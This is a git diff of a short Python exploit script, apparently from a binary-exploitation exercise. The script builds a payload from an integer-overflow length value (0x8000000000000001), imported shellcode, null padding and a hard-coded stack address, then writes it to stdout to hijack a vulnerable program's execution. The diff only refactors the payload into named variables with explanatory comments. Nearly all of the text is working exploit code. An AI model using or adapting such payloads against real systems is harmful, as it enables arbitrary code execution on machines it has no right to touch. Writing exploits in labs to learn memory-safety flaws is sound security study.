@@ -4,12 +4,11 @@ import sys
 
 from shellcode import shellcode
 
-#sys.stdout.buffer.write(0x8fffffffffffffff.to_bytes(8, 'little'))
+#use int overflow to get a big value. Func will read and continue reading if 64 * 4 (size of u_int)
+overflow_val = 0x8000000000000001.to_bytes(8, 'little')
+#after val, put shellcode into registers in memory - locate these after using shellcode memory location
+pad = b'\x00'*18
+#shellcode location:
+shellcode_loc = 0x7ffffff68f90.to_bytes(8, 'little')
 
-#sys.stdout.buffer.write(shellcode)
-'''
-sys.stdout.buffer.write('S'*18)
-
-sys.stdout.buffer.write(0x7ffffff6cda0.to_bytes(8, 'little'))
-'''
-sys.stdout.buffer.write(0x8000000000000001.to_bytes(8, 'little') + shellcode + b'\x00'*18 + 0x7ffffff68f90.to_bytes(8, 'little'))
+sys.stdout.buffer.write(overflow_val + shellcode + pad + shellcode_loc)
